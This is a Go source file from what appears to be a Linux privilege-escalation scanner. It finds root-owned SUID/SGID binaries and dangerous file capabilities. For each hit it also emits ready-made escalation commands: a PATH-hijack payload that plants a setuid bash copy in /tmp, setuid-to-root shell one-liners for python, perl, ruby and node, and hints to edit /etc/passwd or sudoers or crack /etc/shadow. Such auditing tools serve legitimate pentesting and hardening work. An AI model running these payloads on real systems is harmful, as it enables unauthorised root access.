package scan

import (
	"encoding/binary"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"syscall"
)

// FilesystemCheck performs a single read-only walk of the search roots and
// reports two route families that both come from file attributes:
//   - SUID/SGID-root binaries (correlated against GTFOBins)
//   - Linux file capabilities that grant escalation (cap_setuid, cap_dac_*, ...)
type FilesystemCheck struct{}

func (FilesystemCheck) Name() string { return "filesystem" }

// prunedDirs are pseudo-filesystems we never descend into.
var prunedDirs = map[string]bool{
	"/proc": true, "/sys": true, "/dev": true, "/run": true,
}

// defaultSUID are SUID-root binaries shipped by distros. They are down-ranked
// (reported as informational) unless they also match a GTFOBins escape.
var defaultSUID = map[string]bool{
	"su": true, "sudo": true, "mount": true, "umount": true, "passwd": true,
	"chsh": true, "chfn": true, "gpasswd": true, "newgrp": true, "pkexec": true,
	"ping": true, "ping6": true, "fusermount": true, "fusermount3": true,
	"ntfs-3g": true, "ssh-keysign": true, "dbus-daemon-launch-helper": true,
	"polkit-agent-helper-1": true, "pppd": true, "at": true, "chage": true,
	"expiry": true, "crontab": true, "wall": true, "write": true,
}

// CAP bit numbers worth flagging, mapped to their names.
var capNames = map[int]string{
	0:  "cap_chown",
	1:  "cap_dac_override",
	2:  "cap_dac_read_search",
	3:  "cap_fowner",
	6:  "cap_setgid",
	7:  "cap_setuid",
	8:  "cap_setpcap",
	16: "cap_sys_module",
	18: "cap_sys_chroot",
	19: "cap_sys_ptrace",
	21: "cap_sys_admin",
	31: "cap_setfcap",
}

func (f *FilesystemCheck) Detect(c *Context) []Finding {
	var findings []Finding
	seen := map[string]bool{}

	walk := func(path string, d fs.DirEntry, err error) error {
		if c.Ctx.Err() != nil {
			return filepath.SkipAll
		}
		if err != nil {
			if d != nil && d.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}
		if d.IsDir() {
			if prunedDirs[path] {
				return filepath.SkipDir
			}
			return nil
		}
		// Regular files only; never follow symlinks.
		if d.Type()&fs.ModeSymlink != 0 || !d.Type().IsRegular() {
			return nil
		}
		if seen[path] {
			return nil
		}
		info, ierr := d.Info()
		if ierr != nil {
			return nil
		}

		// --- SUID / SGID root binaries ---
		mode := info.Mode()
		if mode&(fs.ModeSetuid|fs.ModeSetgid) != 0 {
			if st, ok := info.Sys().(*syscall.Stat_t); ok && st.Uid == 0 {
				seen[path] = true
				findings = append(findings, suidFinding(path, mode))
			}
		}

		// --- File capabilities ---
		if perm, eff, ok := readCaps(path); ok {
			if cf, has := capFinding(path, perm, eff); has {
				findings = append(findings, cf)
			}
		}
		return nil
	}

	for _, root := range c.SearchRoots {
		_ = filepath.WalkDir(root, walk)
	}
	return findings
}

func suidFinding(path string, mode fs.FileMode) Finding {
	bit := "SUID"
	if mode&fs.ModeSetuid == 0 {
		bit = "SGID"
	}
	base := baseName(path)
	if tech, ok := lookupGTFO(path); ok && tech.Suid != "" {
		return Finding{
			Check:       "filesystem",
			Title:       bit + "-root " + base + " — GTFOBins shell escape",
			Category:    "suid",
			Confidence:  ConfHigh,
			BlastRadius: BlastSafe,
			Evidence:    "root-owned " + bit + " binary: " + path,
			Command:     renderCmd(tech.Suid, path),
			Reference:   tech.Ref,
		}
	}
	if defaultSUID[strings.ToLower(base)] {
		return Finding{
			Check:       "filesystem",
			Title:       "Default " + bit + "-root binary " + base,
			Category:    "suid",
			Confidence:  ConfLow,
			BlastRadius: BlastSafe,
			Evidence:    "standard distro " + bit + " binary: " + path,
			Reference:   "https://gtfobins.github.io/",
		}
	}
	// Non-standard SUID binary with no GTFOBins entry: inspect its strings for a
	// command it likely calls by relative name (a PATH-hijack candidate).
	if mode&fs.ModeSetuid != 0 {
		if cmd, ok := analyzeSuidPathHijack(path); ok {
			return Finding{
				Check:       "filesystem",
				Title:       "Non-standard SUID-root " + base + " — likely PATH hijack via '" + cmd + "'",
				Category:    "suid",
				Confidence:  ConfMedium,
				BlastRadius: BlastReversible,
				Evidence:    path + " references '" + cmd + "' with no absolute path (looks invoked via PATH)",
				Command:     "# " + base + " appears to call '" + cmd + "' by relative name. Hijack it:\n#   mkdir -p /tmp/h; printf '#!/bin/sh\\ncp /bin/bash /tmp/.b; chmod +s /tmp/.b\\n' > /tmp/h/" + cmd + "; chmod +x /tmp/h/" + cmd + "\n#   PATH=/tmp/h:$PATH " + path + " ; /tmp/.b -p",
				Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-binary-with-command-path",
			}
		}
	}
	return Finding{
		Check:       "filesystem",
		Title:       "Non-standard " + bit + "-root binary " + base + " — investigate",
		Category:    "suid",
		Confidence:  ConfMedium,
		BlastRadius: BlastSafe,
		Evidence:    "unusual root-owned " + bit + " binary: " + path,
		Command:     "# no bundled GTFOBins entry — check its behavior; it may call helpers by relative path (PATH hijack)",
		Reference:   "https://gtfobins.github.io/",
	}
}

// commonHijackable are commands frequently invoked by relative name from SUID
// wrapper programs (via system()/execvp), making them PATH-hijack candidates.
var commonHijackable = []string{
	"service", "systemctl", "ps", "id", "ls", "cat", "cp", "mv", "chmod",
	"chown", "ip", "ifconfig", "netstat", "curl", "wget", "apache2ctl",
}

// analyzeSuidPathHijack reads a binary's printable strings and returns a command
// it appears to invoke by relative name (and whose absolute form is absent),
// which is a strong indicator of a PATH-hijack opportunity. Heuristic, so the
// finding is reported as medium confidence.
func analyzeSuidPathHijack(path string) (cmd string, ok bool) {
	strs, err := readStrings(path, 3, 4<<20) // scan up to 4 MiB
	if err != nil {
		return "", false
	}
	hasAbs := map[string]bool{}
	firstWords := map[string]bool{}
	for _, s := range strs {
		fields := strings.Fields(s)
		if len(fields) == 0 {
			continue
		}
		if strings.HasPrefix(fields[0], "/") {
			hasAbs[baseName(fields[0])] = true
		}
		firstWords[fields[0]] = true
	}
	for _, cand := range commonHijackable {
		if firstWords[cand] && !hasAbs[cand] {
			return cand, true
		}
	}
	return "", false
}

// readStrings extracts runs of printable ASCII (>= minLen) from the first
// maxBytes of a file. Pure-Go replacement for shelling out to strings(1).
func readStrings(path string, minLen, maxBytes int) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	buf := make([]byte, maxBytes)
	n, _ := io.ReadFull(f, buf) // a short read (ErrUnexpectedEOF/EOF) is fine
	data := buf[:n]
	var out []string
	var cur []byte
	for _, b := range data {
		if b >= 0x20 && b < 0x7f {
			cur = append(cur, b)
			continue
		}
		if len(cur) >= minLen {
			out = append(out, string(cur))
		}
		cur = cur[:0]
	}
	if len(cur) >= minLen {
		out = append(out, string(cur))
	}
	return out, nil
}

func capFinding(path string, perm uint64, eff bool) (Finding, bool) {
	var names []string
	for bit, name := range capNames {
		if perm&(1<<uint(bit)) != 0 {
			names = append(names, name)
		}
	}
	if len(names) == 0 {
		return Finding{}, false
	}
	base := strings.ToLower(baseName(path))
	cmd := ""
	conf := ConfMedium
	switch {
	case perm&(1<<7) != 0: // cap_setuid
		conf = ConfHigh
		switch base {
		case "python", "python3":
			cmd = path + " -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
		case "perl":
			cmd = path + " -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
		case "ruby":
			cmd = path + " -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
		case "node":
			cmd = path + " -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"
		default:
			cmd = "# " + base + " carries cap_setuid: invoke it to drop privileges to uid 0, then exec a shell"
		}
	case perm&(1<<1) != 0: // cap_dac_override (write any file)
		cmd = "# cap_dac_override: append a uid-0 line to /etc/passwd or a NOPASSWD entry to /etc/sudoers via " + base
	case perm&(1<<2) != 0: // cap_dac_read_search (read any file)
		cmd = "# cap_dac_read_search: read /etc/shadow with " + base + " and crack root's hash offline"
	default:
		cmd = "# capability-based escalation — see GTFOBins capabilities"
	}
	effStr := ""
	if eff {
		effStr = " (effective)"
	}
	return Finding{
		Check:       "filesystem",
		Title:       "Capability " + strings.Join(names, ",") + " on " + baseName(path),
		Category:    "capabilities",
		Confidence:  conf,
		BlastRadius: BlastSafe,
		Evidence:    path + " has " + strings.Join(names, ",") + effStr,
		Command:     cmd,
		Reference:   "https://gtfobins.github.io/#+capabilities",
	}, true
}

// readCaps reads the security.capability xattr (no external tools) and decodes
// it. Returns ok=false when the file has no capability xattr.
func readCaps(path string) (permitted uint64, effective bool, ok bool) {
	buf := make([]byte, 64)
	n, err := syscall.Getxattr(path, "security.capability", buf)
	if err != nil || n < 12 {
		return 0, false, false
	}
	return decodeCaps(buf[:n])
}

// decodeCaps parses a struct vfs_cap_data (little-endian). Pure function so the
// xattr decoding can be unit-tested without a setcap'd binary on disk.
func decodeCaps(b []byte) (permitted uint64, effective bool, ok bool) {
	if len(b) < 12 {
		return 0, false, false
	}
	magic := binary.LittleEndian.Uint32(b[0:4])
	rev := magic & 0xff000000
	effective = magic&0x1 != 0
	permitted = uint64(binary.LittleEndian.Uint32(b[4:8]))
	if (rev == 0x02000000 || rev == 0x03000000) && len(b) >= 16 {
		permitted |= uint64(binary.LittleEndian.Uint32(b[12:16])) << 32
	}
	return permitted, effective, true
}
